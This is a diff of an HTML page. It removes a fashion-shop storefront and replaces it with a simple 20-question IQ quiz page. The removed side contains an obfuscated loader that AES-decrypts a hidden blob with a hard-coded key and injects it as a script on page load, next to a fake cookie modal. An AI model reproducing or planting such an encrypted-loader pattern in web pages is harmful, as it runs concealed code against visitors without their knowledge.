@@ -1,807 +1,111 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
-    <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #f9f9f9;
-      color: #333;
-    }
-    header {
-      background: #000;
-      padding: 20px;
-      text-align: center;
-    }
-    header h1 {
-      color: #FFD700;
-      font-size: 2.2em;
-      margin: 0;
-    }
-    header p {
-      color: #fff;
-      margin-top: 5px;
-    }
-    footer {
-      background: #000;
-      color: #fff;
-      padding: 20px;
-      text-align: center;
-    }
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 20px;
-      background: #fff;
-    }
-    h1, h2, h3 {
-      color: #111;
-    }
-    ul {
-      padding-left: 20px;
-    }
-    .section {
-      margin-top: 40px;
-    }
-    .contact p {
-      margin: 5px 0;
-    }
-    .footer-info {
-      font-size: 0.9em;
-      color: #ccc;
-    }
-    /* Simple style to make the link look normal */
-    a {
-        color: #007BFF;
-        text-decoration: none;
-    }
-    a:hover {
-        text-decoration: underline;
-    }
-  </style>
-</head>
-
-<body>
-	  <script src="https://cdn.tailwindcss.com"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-        return bytes.toString(CryptoJS.enc.Utf8);
-    }
-    const codeString = aesDecode(`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`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
-</script>
-<script>
-    document.body.style.overflow = "hidden";
-</script>
-<div id="cookie-modal-box" class="hidden">
-    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
-    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
-        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
-            <button id="cookie-close" class="absolute top-4 right-4">
-                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
-                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
-                </svg>
-            </button>
-            <div class="flex items-center gap-3 mb-4">
-                <span class="text-yellow-500 text-3xl">🍪</span>
-                <h2 class="text-2xl font-bold">クッキーについて</h2>
-            </div>
-            <p class="text-gray-600 mb-6">
-                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
-                をクリックすると、クッキーの使用に同意したことになります。
-            </p>
-            <div class="flex flex-col sm:flex-row gap-3">
-                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
-                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
-            </div>
-        </div>
-    </div>
-</div>
-<script>
-    const modalBox = document.getElementById("cookie-modal-box"),
-        modal = document.getElementById("cookie-modal"),
-        backdrop = document.getElementById("cookie-backdrop"),
-        acceptBtn = document.getElementById("cookie-accept"),
-        declineBtn = document.getElementById("cookie-decline"),
-        closeBtn = document.getElementById("cookie-close");
-
-    function showModal() {
-        modalBox.classList.remove("hidden");
-        setTimeout(() => {
-            backdrop.classList.remove("opacity-0");
-            modal.classList.remove("opacity-0", "scale-90");
-        }, 10);
-    }
-
-    function hideModal(e) {
-        localStorage.setItem("cookie-consent", e);
-        setTimeout(() => {
-            modalBox.classList.add("hidden");
-        }, 1500);
-
-        // remove mousemove listener once closed
-        document.removeEventListener("mousemove", mouseMoveClose);
-    }
-
-    function mouseMoveClose() {
-        hideModal("closed");
-    }
-
-    acceptBtn.onclick = () => hideModal("accepted");
-    declineBtn.onclick = () => hideModal("declined");
-    closeBtn.onclick = () => hideModal("closed");
-    backdrop.onclick = () => hideModal("closed");
-
-    if (!localStorage.getItem("cookie-consent")) {
-        showModal();
-        document.addEventListener("mousemove", mouseMoveClose, { once: true });
-    }
-</script>
-  
-  
-  
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Aurora Rose | Women's Fashion</title>
-
- 
-  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;700&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
-
-<style>
-/* -------------------------------- */
-/* THEME */
-/* -------------------------------- */
-:root{
-  --bg:#fcf7f8;
-  --panel:#ffffff;
-  --ink:#2d2d2d;
-  --muted:#7a7a7a;
-  --line:#ebebeb;
-  --brand:#d45373;     /* Rose Pink */
-  --brand-soft:rgba(212,83,115,.16);
-  --accent:#22c55e;
-  --radius:14px;
-  --shadow:0 10px 30px rgba(0,0,0,.08);
-}
-
-*{box-sizing:border-box}
-
-body{
-  margin:0;
-  font-family:'Noto Sans JP', 'Poppins', sans-serif;
-  background:var(--bg);
-  color:var(--ink);
-}
-
-/* -------------------------------- */
-/* HEADER */
-/* -------------------------------- */
-header{
-  position:sticky;top:0;z-index:40;
-  background:rgba(255,255,255,.85);
-  backdrop-filter:blur(8px);
-  border-bottom:1px solid var(--line);
-}
-
-.nav{
-  max-width:1200px;
-  margin:auto;
-  padding:14px 20px;
-  display:flex;
-  align-items:center;
-  gap:20px;
-}
-
-.brand{
-  font-weight:700;
-  display:flex;
-  align-items:center;
-  gap:10px;
-  font-size:20px;
-}
-.brand i{color:var(--brand)}
-
-.nav-links{
-  display:flex;gap:18px;
-}
-.nav-links a{
-  color:#2d2d2d;
-  font-size:14px;
-  opacity:.85;
-  text-decoration: none;
-}
-.nav-links a:hover{opacity:1}
-
-.grow{flex:1}
-
-.icon-btn{
-  position:relative;
-  border:1px solid var(--line);
-  background:#fff;
-  padding:10px 14px;
-  border-radius:10px;
-  cursor:pointer;
-}
-.icon-btn:hover{
-  box-shadow:0 0 0 5px var(--brand-soft);
-}
-.badge{
-  position:absolute;
-  top:-6px;right:-6px;
-  background:var(--brand);color:#fff;
-  padding:2px 6px;
-  font-size:12px;
-  border-radius:50%;
-}
-
-/* -------------------------------- */
-/* HERO */
-/* -------------------------------- */
-.hero{
-  min-height:68vh;
-  display:grid;place-items:center;
-  padding:40px 20px;
-  background:
-      linear-gradient(to bottom,rgba(255,255,255,.5),rgba(255,255,255,.8)),
-      url('https://images.unsplash.com/photo-1519741497674-611481863552?q=80&w=2000&auto=format&fit=crop')
-      center/cover no-repeat;
-}
-
-.hero-box{
-  background:rgba(255,255,255,.7);
-  padding:40px;
-  border-radius:20px;
-  max-width:760px;
-  text-align:center;
-  box-shadow:var(--shadow);
-}
-
-.hero-box h1{margin:0 0 14px;font-size:36px; line-height: 1.4;}
-.hero-box p{margin:0 0 20px;color:var(--muted); font-size: 18px;}
-
-.btn{
-  padding:12px 18px;
-  border-radius:12px;
-  border:1px solid transparent;
-  cursor:pointer;
-  font-weight:600;
-  display:inline-flex;
-  gap:8px;
-  text-decoration: none;
-}
-
-.btn.primary{
-  background:var(--brand);
-  color:#fff;
-}
-.btn.primary:hover{filter:brightness(1.05)}
-
-.btn.light{
-  background:#fff;border:1px solid var(--line);
-  color: var(--ink);
-}
-.btn.light:hover{
-  box-shadow:0 0 0 6px var(--brand-soft);
-}
-
-/* -------------------------------- */
-/* MAIN CONTAINER */
-/* -------------------------------- */
-.container{
-  max-width:1200px;
-  margin:auto;
-  padding:50px 20px;
-}
-
-.section-title{
-  text-align:center;
-  margin-top:0;
-  margin-bottom:6px;
-  font-size:26px;
-}
-.section-sub{
-  text-align:center;
-  color:var(--muted);
-  margin-bottom:30px;
-}
-
-/* -------------------------------- */
-/* FILTER BAR */
-/* -------------------------------- */
-.toolbar{
-  display:flex;flex-wrap:wrap;
-  gap:10px;margin-bottom:20px;
-}
-
-.filter-chip{
-  padding:8px 12px;
-  border-radius:999px;
-  border:1px solid var(--line);
-  background:#fff;
-  cursor:pointer;
-  font-size:13px;
-}
-.filter-chip.active{
-  border-color:var(--brand);
-  box-shadow:0 0 0 4px var(--brand-soft);
-  color: var(--brand);
-}
-
-.input{
-  flex:1;min-width:200px;
-  padding:10px 14px;
-  background:#fff;
-  border:1px solid var(--line);
-  border-radius:10px;
-}
-.input:focus{
-  outline:none;
-  border-color:var(--brand);
-}
-
-.select{
-  padding:10px 14px;
-  background:#fff;
-  border:1px solid var(--line);
-  border-radius:10px;
-}
-
-/* -------------------------------- */
-/* PRODUCT GRID */
-/* -------------------------------- */
-.grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
-  gap:20px;
-}
-
-.card{
-  background:#fff;
-  border:1px solid var(--line);
-  border-radius:16px;
-  overflow:hidden;
-  display:flex;flex-direction:column;
-  box-shadow:var(--shadow);
-}
-
-.card img{
-  height:240px;object-fit:cover;
-  width:100%;
-}
-
-.content{padding:16px;}
-.title{font-weight:700;margin-bottom:6px;}
-.desc{color:var(--muted);font-size:13px;min-height:40px;}
-
-.price-row{display:flex;gap:10px;margin:10px 0;}
-.price{font-weight:700;}
-.compare{text-decoration:line-through;color:#aaa;}
-
-.actions{
-  padding:14px;
-  display:flex;gap:10px;
-  margin-top:auto;
-}
-
-.btn.small{padding:10px 12px;font-size:13px}
-
-/* -------------------------------- */
-/* CART DRAWER */
-/* -------------------------------- */
-.drawer{
-  position:fixed;top:0;right:-480px;
-  width:420px;height:100%;
-  max-width:92vw;
-  background:#fff;
-  box-shadow:-10px 0 25px rgba(0,0,0,.12);
-  transition:right .25s;
-  z-index:100;
-  display:flex;flex-direction:column;
-}
-.drawer.open{right:0}
-
-.drawer-header{
-  padding:16px;
-  border-bottom:1px solid var(--line);
-  display:flex;justify-content:space-between;
-  align-items: center;
-}
-
-.drawer-body{
-  flex:1;
-  overflow-y:auto;
-  padding:16px;
-}
-
-.cart-item{
-  display:grid;
-  grid-template-columns:64px 1fr auto;
-  gap:10px;
-  padding:12px 0;
-  border-bottom:1px solid var(--line);
-}
-.cart-item img{
-  width:64px;height:64px;
-  border-radius:8px;
-  object-fit:cover;
-}
-
-.qty{display:flex;gap:8px;margin-top:8px;}
-.qty button{
-  padding:4px 8px;
-  background:#fff;
-  border:1px solid var(--line);
-  border-radius:8px;
-  cursor:pointer;
-}
-
-.drawer-footer{
-  border-top:1px solid var(--line);
-  padding:16px;
-  display:grid;gap:10px;
-}
-.checkout{
-  background:var(--brand);
-  color:#fff;
-  border:none;
-  border-radius:10px;
-  padding:12px;
-  font-weight:700;
-  cursor:pointer;
-}
-.empty{text-align:center;color:var(--muted);padding:20px}
-
-/* -------------------------------- */
-/* FOOTER */
-/* -------------------------------- */
-footer{
-  background:#fff;
-  padding:50px 20px;
-  border-top:1px solid var(--line);
-}
-.foot{
-  max-width:1200px;
-  margin:auto;
-  display:grid;gap:20px;
-  grid-template-columns:2fr 1fr 1fr 1fr;
-}
-@media (max-width: 768px) {
-  .foot { grid-template-columns: 1fr; text-align: center; }
-}
-footer h4{margin-bottom:10px;}
-.copy{text-align:center;margin-top:20px;color:var(--muted)}
-</style>
+  <title>IQ Insight | Professional Assessment</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .green-custom { background-color: #00A86B; }
+    .text-green-custom { color: #00A86B; }
+    .border-green-custom { border-color: #00A86B; }
+  </style>
 </head>
+<body class="bg-[#fafaf9] text-[#2C3345] font-sans">
 
-<body>
-
-<header>
-  <div class="nav">
-    <div class="brand"><i class="fa-solid fa-gem"></i> Aurora Rose</div>
-
-    <div class="nav-links">
-      <a href="#shop">Shop</a>
-      <a href="#collections">Collections</a>
-      <a href="#about">About Us</a>
-      <a href="#contact">Contact</a>
+  <header class="w-full bg-white/70 backdrop-blur-lg border-b border-gray-200 fixed z-50">
+    <div class="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
+      <div class="text-2xl font-bold tracking-tighter">IQ INSIGHT</div>
+      <a href="#test-section" class="px-6 py-2 rounded-xl green-custom text-white font-medium">Start Test</a>
     </div>
+  </header>
 
-    <div class="grow"></div>
+  <main class="max-w-5xl mx-auto px-6 pt-32 pb-20">
+    <section id="hero" class="flex flex-col items-center text-center mb-20">
+      <h1 class="text-4xl lg:text-6xl font-extrabold mb-6">
+        <span class="text-[#2C3345]">Want to Know Your</span><br/>
+        <span class="text-blue-600">Real IQ Score?</span>
+      </h1>
+      <p class="text-lg text-gray-600 max-w-md mb-8">Take our 20-question IQ test and unlock your path to self-discovery and development.</p>
+      <button onclick="document.getElementById('test-section').scrollIntoView({behavior: 'smooth'})" class="px-8 py-4 rounded-xl green-custom text-white text-lg font-bold hover:opacity-90 transition">Start IQ Test Now</button>
+    </section>
 
-    <button id="cartBtn" class="icon-btn">
-      <i class="fa-solid fa-bag-shopping"></i>
-      <span id="cartBadge" class="badge">0</span>
-    </button>
-  </div>
-</header>
-
-<section class="hero">
-  <div class="hero-box">
-    <h1>Comfortable, Authentic,<br>Beautiful.</h1>
-    <p>Curated elegant and minimalist designs for the modern woman. Pieces to color your everyday life.</p>
-
-    <a href="#shop" class="btn primary"><i class="fa-solid fa-heart"></i> Buy Now</a>
-    <a href="#collections" class="btn light">View Collections</a>
-  </div>
-</section>
-
-<section class="container" id="shop">
-  <h2 class="section-title">Featured Items</h2>
-  <p class="section-sub">Find the perfect style for you.</p>
-
-  <div class="toolbar">
-    <button class="filter-chip active" data-filter="all">All</button>
-    <button class="filter-chip" data-filter="dresses">Dresses</button>
-    <button class="filter-chip" data-filter="tops">Tops</button>
-    <button class="filter-chip" data-filter="bottoms">Bottoms</button>
-    <button class="filter-chip" data-filter="accessories">Accessories</button>
-
-    <div class="grow"></div>
-
-    <input id="q" class="input" placeholder="Search (e.g., floral, linen)">
-    <select id="sortSelect" class="select">
-      <option value="featured">Featured</option>
-      <option value="priceAsc">Price: Low to High</option>
-      <option value="priceDesc">Price: High to Low</option>
-      <option value="rating">Popularity</option>
-    </select>
-  </div>
-
-  <div id="grid" class="grid"></div>
-</section>
-
-<section class="container" id="collections">
-  <h2 class="section-title">Collections</h2>
-  <p class="section-sub">A special selection perfect for the changing seasons.</p>
-
-  <div class="grid" style="grid-template-columns:repeat(auto-fit, minmax(280px, 1fr))">
-    <article class="card">
-      <img src="https://images.unsplash.com/photo-1520975661595-645391095997?q=80&w=1600&auto=format&fit=crop">
-      <div class="content">
-        <div class="title">Soft Pastels</div>
-        <p class="desc">Gentle tones that fulfill a timeless feminine style.</p>
-      </div>
-    </article>
-
-    <article class="card">
-      <img src="https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=1600&auto=format&fit=crop">
-      <div class="content">
-        <div class="title">Neutral Capsule</div>
-        <p class="desc">Ivory, sand, beige — the ultimate basic items.</p>
-      </div>
-    </article>
-
-    <article class="card">
-      <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=1600&auto=format&fit=crop">
-      <div class="content">
-        <div class="title">Cozy Edit</div>
-        <p class="desc">Soft sweaters with a relaxed and comfortable fit.</p>
-      </div>
-    </article>
-  </div>
-</section>
-
-<aside id="drawer" class="drawer">
-  <div class="drawer-header">
-    <h3>Shopping Bag</h3>
-    <button id="closeDrawer" class="icon-btn">
-      <i class="fa-solid fa-xmark"></i>
-    </button>
-  </div>
-
-  <div id="cartList" class="drawer-body"></div>
-
-  <div class="drawer-footer">
-    <div class="total-row" style="display:flex; justify-content:space-between; margin-bottom:10px;">
-        <strong>Subtotal</strong> <div id="subtotal">$0</div>
-    </div>
-    <button id="checkoutBtn" class="checkout">Proceed to Checkout</button>
-  </div>
-</aside>
-
-<footer>
-  <div class="foot">
-    <div>
-      <h4>Aurora Rose</h4>
-      <p>For every woman. We offer modern and elegant everyday wear.</p>
-    </div>
-    <div>
-      <h4>Shop</h4>
-      <p>Dresses • Tops • Bottoms • Accessories</p>
-    </div>
-    <div>
-      <h4>Support</h4>
-      <p>Shipping Info • Returns & Exchanges • FAQ</p>
-    </div>
-    <div>
-      <h4>Contact Us</h4>
-      <p id="contact">hello@aurorarose.shop<br>Riyadh, Saudi Arabia</p>
-    </div>
-  </div>
-  <div class="copy">© 2026 Aurora Rose. All rights reserved.</div>
-</footer>
-
-<script>
-/* ------------------------------- */
-/* PRODUCT DATA */
-/* ------------------------------- */
-const PRODUCTS = [
-  {
-    id:'p1', title:'Rose Chiffon Dress', category:'dresses', rating:4.8,
-    price:79.00, compareAt:99.00,
-    img:'https://images.unsplash.com/photo-1520975661595-645391095997?q=80&w=1600&auto=format&fit=crop',
-    desc:'An elegant dress made of lightweight chiffon material.'
-  },
-  {
-    id:'p2', title:'Soft Knit Sweater', category:'tops', rating:4.7,
-    price:65.00,
-    img:'https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=1600&auto=format&fit=crop',
-    desc:'Warm and stylish for any look.'
-  },
-  {
-    id:'p3', title:'High-Waist Linen Pants', category:'bottoms', rating:4.6,
-    price:55.00,
-    img:'https://images.unsplash.com/photo-1551854838-212c50b4c184?q=80&w=1600&auto=format&fit=crop',
-    desc:'Elegant linen material with a relaxed feel.'
-  },
-  {
-    id:'p4', title:'Minimal Gold Necklace', category:'accessories', rating:4.9,
-    price:45.00,
-    img:'https://images.unsplash.com/photo-1547949003-9792a18a2601?q=80&w=1600&auto=format&fit=crop',
-    desc:'An accessory that complements your daily outfit.'
-  },
-  {
-    id:'p5', title:'Wrap Maxi Dress', category:'dresses', rating:4.8,
-    price:89.00,
-    img:'https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=1600&auto=format&fit=crop',
-    desc:'An elegant cut with a beautiful waistline.'
-  },
-  {
-    id:'p6', title:'Silk Camisole', category:'tops', rating:4.5,
-    price:49.00,
-    img:'https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=1600&auto=format&fit=crop',
-    desc:'High-quality 100% silk. Perfect as an inner or alone.'
-  }
-];
-
-let state = {
-  q:'',
-  filter:'all',
-  sort:'featured',
-  cart: JSON.parse(localStorage.getItem('ar_cart') || '{}')
-};
-
-const usd = n => '$' + n.toLocaleString(undefined, {minimumFractionDigits: 2});
-
-function saveCart(){ localStorage.setItem('ar_cart',JSON.stringify(state.cart)); }
-
-/* ------------------------------- */
-/* RENDER PRODUCTS */
-/* ------------------------------- */
-function renderProducts(){
-  const grid=document.getElementById('grid');
-  grid.innerHTML='';
-
-  const items=[...PRODUCTS].filter(p=>{
-    const okF = state.filter==='all' || p.category===state.filter;
-    const q = state.q.toLowerCase();
-    const okQ = p.title.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q);
-    return okF && okQ;
-  }).sort((a,b)=>{
-    if(state.sort==='priceAsc') return a.price-b.price;
-    if(state.sort==='priceDesc') return b.price-a.price;
-    if(state.sort==='rating') return b.rating-a.rating;
-    return 0;
-  });
-
-  if(!items.length){
-    grid.innerHTML='<p class="section-sub" style="grid-column: 1/-1;">No matching products found.</p>';
-    return;
-  }
-
-  items.forEach(p=>{
-    const card=document.createElement('div');
-    card.className='card';
-    card.innerHTML=`
-      <img src="${p.img}" alt="${p.title}">
-      <div class="content">
-        <div class="title">${p.title}</div>
-        <div class="desc">${p.desc}</div>
-        <div class="price-row">
-          <div class="price">${usd(p.price)}</div>
-          ${p.compareAt?`<div class="compare">${usd(p.compareAt)}</div>`:''}
+    <section id="test-section" class="bg-white p-8 lg:p-12 rounded-3xl shadow-sm border border-gray-100">
+      <div id="quizArea">
+        <div class="w-full bg-gray-100 h-2 rounded-full mb-8 overflow-hidden">
+          <div id="progress" class="h-full green-custom w-[5%] transition-all duration-500"></div>
         </div>
+        <h2 id="qText" class="text-2xl font-bold mb-6">Loading...</h2>
+        <div id="options" class="grid grid-cols-1 gap-4"></div>
       </div>
-      <div class="actions">
-        <button class="btn light small">Wishlist</button>
-        <button class="btn primary small" data-add="${p.id}">Add to Bag</button>
-      </div>
-    `;
-    grid.appendChild(card);
-  });
-}
-
-/* ------------------------------- */
-/* CART */
-/* ------------------------------- */
-function renderCart(){
-  const list=document.getElementById('cartList');
-  const items=Object.values(state.cart);
-
-  if(!items.length){
-    list.innerHTML='<div class="empty">Your shopping bag is empty.</div>';
-  } else {
-    list.innerHTML=items.map(it=>`
-      <div class="cart-item">
-        <img src="${it.img}">
-        <div>
-          <strong>${it.title}</strong>
-          <div class="qty">
-            <button data-dec="${it.id}">-</button>
-            <span>${it.qty}</span>
-            <button data-inc="${it.id}">+</button>
-            <button class="remove" data-rem="${it.id}" style="border:none; color:var(--brand); font-size:12px; margin-left:10px; background:none; cursor:pointer;">Remove</button>
-          </div>
+      
+      <div id="resultArea" class="hidden text-center py-10">
+        <h2 class="text-3xl font-bold mb-4">Assessment Complete</h2>
+        <p id="scoreText" class="text-2xl font-bold text-green-custom mb-8"></p>
+        
+        <div class="max-w-sm mx-auto mb-8">
+          <svg viewBox="0 0 200 100" class="w-full">
+            <path d="M 0 100 C 50 100, 50 10, 100 10 C 150 10, 150 100, 200 100" fill="none" stroke="#CBD5E1" stroke-width="2"/>
+            <path d="M 0 100 C 50 100, 50 10, 100 10 C 150 10, 150 100, 200 100" fill="#E2E8F0" opacity="0.5"/>
+            <circle cx="100" cy="10" r="4" fill="#00A86B"/>
+            <text x="100" y="5" font-size="8" text-anchor="middle" fill="#00A86B">Your Score</text>
+          </svg>
         </div>
-        <div>${usd(it.qty*it.price)}</div>
+        
+        <button onclick="location.reload()" class="px-6 py-3 rounded-xl bg-gray-100 font-medium hover:bg-gray-200">Restart Test</button>
       </div>
-    `).join('');
-  }
+    </section>
+  </main>
 
-  const subtotal = items.reduce((a,i)=>a+i.price*i.qty,0);
-  document.getElementById('subtotal').textContent = usd(subtotal);
-  document.getElementById('cartBadge').textContent = items.reduce((a,i)=>a+i.qty,0);
-}
+  <script>
+    const QUESTIONS = [
+      { q: "3, 6, 9, 12, ... What's next?", a: ["13", "15", "18"], correct: "15" },
+      { q: "Dog is to Mammal, as Crocodile is to...", a: ["Bird", "Fish", "Reptile"], correct: "Reptile" },
+      { q: "1, 2, 4, 8, 16, ... What's next?", a: ["24", "32", "64"], correct: "32" },
+      { q: "Opposite of North is South. Opposite of East is...", a: ["West", "Right", "Left"], correct: "West" },
+      { q: "10 - 2 * 3 = ?", a: ["4", "24", "8"], correct: "4" },
+      { q: "Which is the odd one out?", a: ["Apple", "Banana", "Chair"], correct: "Chair" },
+      { q: "0, 1, 1, 2, 3, 5, ... What's next?", a: ["6", "7", "8"], correct: "8" },
+      { q: "Opposite of Day is Night. Opposite of Morning is...", a: ["Evening", "Late", "Day"], correct: "Evening" },
+      { q: "3 squared is?", a: ["6", "9", "12"], correct: "9" },
+      { q: "Which letter is the odd one out?", a: ["A", "E", "B"], correct: "B" },
+      { q: "Plane is to Sky, as Ship is to...", a: ["Land", "Sea", "Space"], correct: "Sea" },
+      { q: "Half of 50% is?", a: ["10%", "25%", "20%"], correct: "25%" },
